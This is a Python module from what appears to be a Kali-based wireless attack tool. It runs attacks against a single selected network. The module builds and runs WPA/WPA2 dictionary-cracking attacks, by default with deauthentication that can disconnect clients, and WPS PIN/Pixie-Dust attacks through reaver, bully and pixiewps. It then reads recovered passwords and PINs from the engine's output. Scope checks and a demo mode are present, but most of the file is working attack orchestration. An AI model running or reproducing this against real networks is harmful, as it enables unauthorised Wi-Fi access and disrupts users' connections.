"""Connect one selected network to the existing engine without a terminal handoff."""
from dataclasses import asdict, replace
import json
from pathlib import Path
import shutil
from threading import Event
import time

from .access import require_root
from .backend import engine_argv
from .models import Command, Scope, clean, now
from .radio import Radio
from .runner import run


def wordlist_default():
    for name in ("/usr/share/wordlists/rockyou.txt", "/usr/share/wordlists/fern-wifi/common.txt"):
        if Path(name).is_file():
            return name
    return ""


def command_for(scope, network, kind, settings, directory, demo=False):
    scope.validate(target=True)
    if network.bssid.lower() != scope.bssid or network.channel != scope.channel:
        raise ValueError("The selected network and session scope differ. Select the network again.")
    if kind not in {"wpa", "wps"}:
        raise ValueError("Choose WPA/WPA2 or WPS.")
    security = set(network.security.upper().split())
    if not security or not security <= {"WPA", "WPA2"} or "MGT" in network.authentication.upper():
        raise ValueError("These workflows support WPA/WPA2 personal networks. The selected security type is unsupported or unknown.")
    seconds = int(settings.get("seconds", 600))
    if not 30 <= seconds <= 86400:
        raise ValueError("Choose an overall runtime between 30 and 86400 seconds.")
    args = ["-i", scope.interface, "-b", scope.bssid, "-c", str(scope.channel), "--first", "1", "--no-pmkid"]
    if kind == "wpa":
        words = str(settings.get("wordlist", ""))
        if not words:
            raise ValueError("Choose a local wordlist before starting WPA/WPA2 password recovery.")
        words = Path(words).expanduser().resolve()
        if not demo:
            if not words.is_file() or words.suffix == ".gz":
                raise ValueError("Choose an existing, uncompressed text wordlist.")
            with words.open("rb") as stream:
                if not stream.read(1):
                    raise ValueError("The selected wordlist is empty.")
        args += ["--wpa", "--no-wps", "--dict", str(words), "--wpat", str(seconds)]
        if not settings.get("deauth", True):
            args.append("--nodeauths")
        title = "WPA/WPA2 password Exploit"
        effect = "SELECTED NETWORK / MAY DISCONNECT ITS CLIENTS" if settings.get("deauth", True) else "SELECTED NETWORK / PASSIVE CAPTURE + OFFLINE WORDLIST"
    else:
        args += ["--wps-only", "--nodeauths", "--wps-time", str(seconds)]
        title, effect = "WPS PIN / Pixie-Dust Exploit", "SELECTED NETWORK / ACTIVE WPS REQUESTS"
    return Command(title, ["hifi", "engine", *args],
                   "Run the chosen workflow for this BSSID, channel and adapter only.",
                   effect, timeout=seconds, root=True, cwd=str(directory))


def missing_tools(kind):
    names = ["iw", "ip", "airodump-ng", "aircrack-ng", "aireplay-ng", "tshark"]
    names += ["hashcat", "hcxpcapngtool"] if kind == "wpa" else ["pixiewps"]
    missing = [name for name in names if not shutil.which(name)]
    if kind == "wps" and not any(shutil.which(name) for name in ("reaver", "bully")):
        missing.append("reaver or bully")
    return missing


def read_recovery(directory, bssid, kind):
    """Read fresh structured evidence, never infer recovered credentials from exit 0."""
    path = Path(directory) / "cracked.json"
    if not path.exists():
        return None
    if path.is_symlink() or path.stat().st_size > 1024 * 1024:
        raise ValueError("Recovery result file is unsafe or too large to read.")
    rows = json.loads(path.read_text())
    if not isinstance(rows, list):
        raise ValueError("The engine returned an invalid recovery result file.")
    for row in reversed(rows):
        if not isinstance(row, dict) or str(row.get("bssid", "")).lower() != bssid.lower():
            continue
        if row.get("type") != kind.upper():
            continue
        names = ("key",) if kind == "wpa" else ("pin", "psk")
        evidence = {name: clean(row[name]) for name in names
                    if isinstance(row.get(name), str) and row[name] and len(row[name]) <= 1024}
        if evidence:
            return evidence
    return None


class Job:
    def __init__(self, app, network, kind):
        self.app, self.network, self.kind = app, network, kind
        self.scope = Scope(**asdict(app.session.scope)).validate(target=True)
        self.settings = dict(app.session.exploit_settings)
        self.directory = app.output_path("exploit")
        self.command = command_for(self.scope, network, kind, self.settings, self.directory, app.session.demo)
        self.mode = "preparing"

    def readiness(self):
        require_root(self.app.session.demo)
        if not self.app.session.demo:
            missing = missing_tools(self.kind)
            if missing:
                raise ValueError("Missing: " + ", ".join(missing) +
                                 ".\nInstall the matching Kali packages before running this workflow.\n"
                                 "WPA/WPA2: aircrack-ng iw iproute2 tshark hashcat hcxtools\n"
                                 "WPS: aircrack-ng iw iproute2 tshark reaver pixiewps (or bully)")

    def execute(self, stop=None, emit=None):
        stop, emit = stop or Event(), emit or (lambda _: None)
        app = self.app
        started = time.monotonic()
        record = {"title": self.command.title, "argv": self.command.argv, "effect": self.command.effect,
                  "started": now(), "status": "error", "returncode": None, "output": "", "cwd": str(self.directory),
                  "mode": "selected-network", "recovery": None, "selected_target": asdict(self.network)}
        radio = Radio(self.scope.interface, app.store.folder(app.session), stop, emit, app.session.demo)
        try:
            self.readiness()
            if stop.is_set():
                raise InterruptedError("Cancelled before adapter changes.")
            # Each attempt has a new directory: earlier cracked.json files cannot report false success.
            self.directory.mkdir(mode=0o700)
            with radio:
                emit("Preparing the selected adapter…\n")
                radio.monitor(self.scope.channel)
                self.scope.interface = radio.interface
                self.mode = "monitor"
                app.session.scope.interface = radio.interface
                command = command_for(self.scope, self.network, self.kind, self.settings, self.directory, app.session.demo)
                record["argv"] = command.argv
                if app.session.demo:
                    record.update(status="simulated", output="[DEMO] Selected-network workflow preview. No radio commands or recovery performed.\n")
                    emit(record["output"])
                else:
                    emit("Running for the selected BSSID. Escape stops this attempt.\n")
                    argv = engine_argv(command.argv[2:])
                    argv.insert(1, "-u")  # Stream Python progress while curses owns the terminal.
                    result = run(replace(command, argv=argv), self.directory, stop, emit)
                    record.update({k: v for k, v in result.items() if k != "argv"})
                    record["recovery"] = read_recovery(self.directory, self.scope.bssid, self.kind)
                    if record["status"] == "ok":
                        record["status"] = "recovered" if record["recovery"] else "no-recovery"
        except InterruptedError as exc:
            record.update(status="cancelled", output=record["output"] + "\n" + clean(exc))
        except (ValueError, OSError, RuntimeError) as exc:
            record.update(status="error", output=record["output"] + "\n" + clean(exc))
        finally:
            app.session.scope.interface = radio.interface
            record["steps"] = radio.steps
            record["adapter_restoration"] = "incomplete" if radio.restore_errors else "restored" if radio.changed else "unchanged"
            self.mode = record["adapter_restoration"]
            if radio.restore_errors:
                record.update(status="error", output=record["output"] + "\n" + "\n".join(radio.restore_errors))
            record["elapsed"] = round(time.monotonic() - started, 2)
            app.session.records.append(record)
            app.store.save(app.session)
        return record


def result_text(record):
    evidence = record.get("recovery")
    if evidence:
        outcome = "PASSWORD RECOVERED" if evidence.get("key") or evidence.get("psk") else "WPS PIN RECOVERED / PASSWORD NOT RECOVERED"
    else:
        outcome = {"simulated": "DEMO ONLY / NO RECOVERY", "no-recovery": "NO PASSWORD OR PIN RECOVERED",
                   "cancelled": "CANCELLED", "timeout": "TIME LIMIT REACHED", "failed": "ENGINE FAILED", "error": "WORKFLOW ERROR"}.get(record["status"], "NO VERIFIED RECOVERY")
    lines = [outcome, "", "Process status: " + record["status"], "Exit code: " + str(record.get("returncode")),
             "Adapter: " + record.get("adapter_restoration", "unknown"), "Files: " + record.get("cwd", ""), ""]
    for name, value in (evidence or {}).items():
        lines.append({"key": "Password", "psk": "Password", "pin": "WPS PIN"}[name] + ": " + value)
    if not evidence:
        lines.append("A completed process does not establish password/PIN recovery. Review the engine output below.")
    return "\n".join(lines) + "\n\nENGINE OUTPUT\n" + record["output"]
